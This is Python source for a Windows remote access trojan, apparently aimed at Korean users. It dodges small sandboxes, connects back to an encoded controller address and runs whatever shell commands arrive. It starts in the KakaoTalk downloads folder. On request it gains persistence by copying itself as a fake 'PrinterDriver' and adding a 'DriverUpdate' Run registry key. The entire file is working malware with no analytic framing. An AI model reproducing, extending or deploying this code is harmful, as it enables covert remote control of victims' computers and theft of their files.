import os
import time
import socket
import shutil
import base64
import subprocess
import webbrowser
import winreg as wreg

if os.cpu_count() <= 2:
    quit()

def decode_base64(data):
    return base64.b64decode(data).decode()

def execute_command(command):
    if command == "ls":
        command = "dir"
    elif command == "clear":
        command = "cls"

    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_value, stderr_value = proc.communicate()
    return stdout_value + stderr_value

def add_to_registry(rat_name,userprof):
    path = os.getcwd().strip('\n')

    dirname = "Drivers"
    dirpath = os.path.join(userprof, "AppData", "Roaming", dirname)

    os.makedirs(dirpath, exist_ok=True)

    destination = os.path.join(dirpath, 'PrinterDriver.pyzw')

    if not os.path.exists(destination):
        shutil.move(os.path.join(path, rat_name), destination)
    
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'DriverUpdate', 0, wreg.REG_SZ, destination)
    key.Close()

def cleanup_registry():
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
    wreg.DeleteValue(key, 'DriverUpdate')
    key.Close()
    
if __name__ == "__main__":

    HOST = decode_base64('')
    PORT = int(decode_base64(''))
    
    rat_name = os.path.basename(__file__)
    userprof = os.getenv('USERPROFILE')

    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                s.sendall(b"[*] Connection Established!\n")

                target_path = os.path.join(userprof, 'Documents', '카카오톡 받은 파일')
                
                if os.path.exists(target_path):
                    os.chdir(target_path)
                else:
                    s.sendall(b"[-] Target path does not exist. Remaining in the current directory.\n")

                while True:
                    s.sendall(str.encode(os.getcwd() + "> "))
                    data = s.recv(1024).decode("UTF-8").strip('\n')
                    
                    if data == "startup":
                        add_to_registry(rat_name, userprof)
                        s.sendall(b"[+] Successfully added to the startup registry!\n")
                        continue

                    if data == "cleanup":
                        cleanup_registry()
                        s.sendall(b"[+] Successfully removed from the startup registry!\n")
                        continue

                    if data == "quit":
                        break
                    
                    if data.startswith("cd "):
                        try:
                            os.chdir(data[3:])
                            continue
                        except Exception as e:
                            s.sendall(str.encode("Error changing directory: " + str(e) + "\n"))
                            continue

                    if len(data) > 0:
                        output = execute_command(data)
                        output_str = output.decode('cp949', 'ignore')
                        s.sendall(str.encode("\n" + output_str))
                    
        except Exception as e:
            time.sleep(15)